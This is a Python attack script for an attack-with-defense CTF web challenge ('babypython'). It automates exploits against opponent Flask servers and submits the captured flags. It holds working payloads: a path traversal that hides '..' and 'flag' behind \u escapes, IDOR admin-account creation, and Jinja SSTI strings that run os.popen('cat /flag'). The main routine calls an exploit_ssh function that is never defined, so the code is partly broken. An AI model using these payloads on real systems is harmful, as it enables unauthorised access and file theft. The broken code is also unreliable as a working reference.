#!/usr/bin/env python3
"""
AWD Web Exploit - babypython
============================
Vulnerabilities exploited:
1. Path Traversal via Unicode Escape Bypass (CVE-like) - PRIMARY EXPLOIT
2. IDOR in /admin/user/edit/<id> - Any user can edit any user
3. IDOR in /admin/user/add - Any user can create admin users  
4. PDF export (ReportLab) - Potential CVE-2023-33733

Usage:
    python3 web.py              # Run against all targets
    python3 web.py 172.28.36.31 # Run against specific IP
    python3 web.py --loop       # Run continuously
    python3 web.py --info       # Print competition info
"""

import sys
import re
import os
import time
import random
import string
import subprocess
import requests

from awd_lib import (
    chal, submit, targets, our_ip, discord,
    setup_auth, ssh_command, print_info, print_targets,
)

# === CHALLENGE CONFIG ===
PORT = 5000           # Flask app port
TIMEOUT = 10          # Request timeout
LOOP_DELAY = 60       # Seconds between rounds (for --loop)
PEM_FILE = "auth.pem" # SSH key file

# Configure for this challenge
chal("babypython.csv")


def random_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def unicode_encode(s):
    """
    Encode every character as \\uXXXX to bypass raw byte content filters.
    This bypasses checks like: b'..' in path or b'flag' in path
    """
    result = ""
    for c in s:
        result += "\\u{:04x}".format(ord(c))
    return result


# ========================
# EXPLOIT 0: Path Traversal with Unicode Escape Bypass (PRIMARY)
# ========================

def exploit_path_traversal_unicode(ip, port):
    """
    Exploits /download_attachment with JSON Unicode Escape Bypass.
    Encodes the entire path as \\uXXXX to bypass raw byte content filters.
    
    The app checks: b'..' in path or b'flag' in path
    Unicode escapes like \\u002e\\u002e bypass these byte checks.
    """
    try:
        base_url = f"http://{ip}:{port}"
        session = requests.Session()
        session.timeout = TIMEOUT
        
        # Register and login
        username = f"exp_{random_str()}"
        session.post(f"{base_url}/register", data={
            "username": username,
            "password": username
        }, timeout=TIMEOUT)
        session.post(f"{base_url}/login", data={
            "username": username,
            "password": username
        }, timeout=TIMEOUT)
        
        # Try different paths with unicode encoding
        paths_to_try = [
            "/flag",
            "../../../../flag",
            "../../../../../flag",
        ]
        
        for path in paths_to_try:
            encoded = unicode_encode(path)
            payload = '{"path": "' + encoded + '"}'
            
            r = session.post(
                f"{base_url}/download_attachment",
                data=payload,
                headers={"Content-Type": "application/json"},
                timeout=TIMEOUT
            )
            
            if r.status_code == 200:
                flag = extract_flag(r.text)
                if flag:
                    return flag
                # Also check raw content
                if b'flag{' in r.content or b'hkcert' in r.content:
                    return r.content.decode().strip()
        
        return None
        
    except Exception as e:
        return None


# ========================
# EXPLOIT 1: IDOR Admin Creation
# ========================

def exploit_idor(ip, port):
    """
    Exploit IDOR vulnerability to create an admin user.
    """
    try:
        base_url = f"http://{ip}:{port}"
        session = requests.Session()
        session.timeout = TIMEOUT
        
        # Register and login as normal user
        username = f"exp_{random_str()}"
        session.post(f"{base_url}/register", data={
            "username": username,
            "password": username
        })
        r = session.post(f"{base_url}/login", data={
            "username": username,
            "password": username
        }, allow_redirects=True)
        
        if "logout" not in r.text.lower():
            return None
        
        # Check if IDOR is available
        r = session.get(f"{base_url}/admin/user/add")
        if r.status_code != 200:
            return None
        
        # Create admin user via IDOR
        admin_user = f"adm_{random_str()}"
        admin_pass = random_str(12)
        
        r = session.post(f"{base_url}/admin/user/add", data={
            "username": admin_user,
            "password": admin_pass,
            "is_admin": "1"
        })
        
        # Login as new admin
        admin_session = requests.Session()
        admin_session.timeout = TIMEOUT
        r = admin_session.post(f"{base_url}/login", data={
            "username": admin_user,
            "password": admin_pass
        }, allow_redirects=True)
        
        if "logout" not in r.text.lower():
            return None
        
        # Access admin panel for flag
        r = admin_session.get(f"{base_url}/admin/panel")
        flag = extract_flag(r.text)
        if flag:
            return flag
        
        return None
        
    except Exception as e:
        return None


# ========================
# EXPLOIT 2: Path Traversal
# ========================

def exploit_path_traversal(ip, port):
    """
    Exploit path traversal in /download_attachment to read /flag.
    """
    try:
        base_url = f"http://{ip}:{port}"
        session = requests.Session()
        session.timeout = TIMEOUT
        
        # Need to be logged in
        username = f"pt_{random_str()}"
        session.post(f"{base_url}/register", data={"username": username, "password": username})
        session.post(f"{base_url}/login", data={"username": username, "password": username})
        
        traversal_paths = [
            "../../../flag",
            "../../../../flag", 
            "../../../../../flag",
            "..%2f..%2f..%2fflag",
        ]
        
        for payload in traversal_paths:
            try:
                r = session.post(
                    f"{base_url}/download_attachment",
                    json={"path": payload},
                    timeout=TIMEOUT
                )
                
                if r.status_code == 200 and b"flag{" in r.content:
                    return r.content.decode().strip()
                    
                flag = extract_flag(r.text)
                if flag:
                    return flag
            except:
                continue
        
        return None
        
    except Exception as e:
        return None


# ========================
# EXPLOIT 3: SSTI
# ========================

def exploit_ssti(ip, port):
    """
    Exploit Server-Side Template Injection via post content.
    """
    try:
        base_url = f"http://{ip}:{port}"
        session = requests.Session()
        session.timeout = TIMEOUT
        
        username = f"ssti_{random_str()}"
        session.post(f"{base_url}/register", data={"username": username, "password": username})
        session.post(f"{base_url}/login", data={"username": username, "password": username})
        
        ssti_payloads = [
            "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
            "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
            "{{url_for.__globals__.__builtins__.open('/flag').read()}}",
        ]
        
        for payload in ssti_payloads:
            try:
                r = session.post(f"{base_url}/create", data={
                    "title": f"SSTI {random_str(4)}",
                    "content": payload
                }, allow_redirects=True)
                
                r2 = session.get(f"{base_url}/")
                posts = re.findall(r'/post/(\d+)', r2.text)
                if posts:
                    r3 = session.get(f"{base_url}/post/{posts[-1]}")
                    flag = extract_flag(r3.text)
                    if flag:
                        return flag
            except:
                continue
        
        return None
        
    except Exception as e:
        return None


def exploit(ip, port):
    """
    Main exploit function - tries all exploits in order of reliability.
    """
    # Try SSH first (most reliable)
    flag = exploit_ssh(ip)
    if flag:
        return flag
    
    # Try IDOR
    flag = exploit_idor(ip, port)
    if flag:
        return flag
    
    # Try path traversal
    flag = exploit_path_traversal(ip, port)
    if flag:
        return flag
    
    # Try SSTI
    flag = exploit_ssti(ip, port)
    if flag:
        return flag
    
    return None


def extract_flag(text):
    """
    Extract flag from response text.
    Modify the pattern to match your CTF's flag format.
    """
    # Common flag patterns - adjust as needed
    patterns = [
        r'hkcert\d{2}\{[^}]+\}',  # hkcert24{...}
        r'flag\{[^}]+\}',         # flag{...}
        r'FLAG\{[^}]+\}',         # FLAG{...}
        r'CTF\{[^}]+\}',          # CTF{...}
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(0)
    return None


# ========================
# RUNNER CODE (don't edit)
# ========================

def run_single(ip):
    """Run exploit against a single target."""
    print(f"[*] Attacking {ip}:{PORT}...")
    flag = exploit(ip, PORT)
    
    if flag:
        print(f"[+] Got flag: {flag}")
        result = submit(flag, target=ip)
        if result["success"]:
            if result["duplicate"]:
                print(f"[=] Flag submitted (duplicate)")
            else:
                print(f"[+] NEW FLAG SUBMITTED!")
                # discord.pwned(ip, flag)  # Optional
        else:
            print(f"[-] Submit failed: {result['message']}")
        return True
    else:
        print(f"[-] No flag from {ip}")
        return False


def run_all():
    """Run exploit against all targets."""
    target_list = targets()  # Already excludes our IP
    
    print(f"[*] Our IP: {our_ip()}")
    print(f"[*] Targets: {len(target_list)}")
    print(f"[*] Port: {PORT}")
    print()
    
    # discord.info(f"Starting exploit round on {len(target_list)} targets")  # Optional
    
    success = 0
    failed = 0
    
    for ip in target_list:
        if run_single(ip):
            success += 1
        else:
            failed += 1
    
    print()
    print(f"[*] Done: {success} success, {failed} failed")
    # discord.info(f"Round complete: {success} success, {failed} failed")  # Optional
    return success, failed


def run_loop():
    """Run exploit continuously."""
    print(f"[*] Running in loop mode (Ctrl+C to stop)")
    print(f"[*] Delay between rounds: {LOOP_DELAY}s")
    
    round_num = 0
    while True:
        round_num += 1
        print(f"\n{'='*50}")
        print(f"ROUND {round_num}")
        print(f"{'='*50}")
        
        try:
            run_all()
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            break
        except Exception as e:
            print(f"[-] Round error: {e}")
            # discord.error(f"Round {round_num} error", exc=e)  # Optional
        
        print(f"[*] Sleeping {LOOP_DELAY}s...")
        try:
            time.sleep(LOOP_DELAY)
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            break


def main():
    # Auto-setup auth PEM file with correct permissions
    try:
        setup_auth()
    except Exception as e:
        print(f"[!] Auth setup skipped: {e}")
    
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg == "--loop" or arg == "-l":
            run_loop()
        elif arg == "--help" or arg == "-h":
            print(__doc__)
        elif arg == "--info" or arg == "-i":
            print_info()
        elif arg == "--targets" or arg == "-t":
            print_targets()
        elif arg == "--ssh":
            # Print SSH command for first target or specified IP
            ip = sys.argv[2] if len(sys.argv) > 2 else targets()[0]
            print(ssh_command(ip))
        else:
            # Attack specific IP
            run_single(arg)
    else:
        # Attack all targets once
        run_all()


if __name__ == "__main__":
    main()
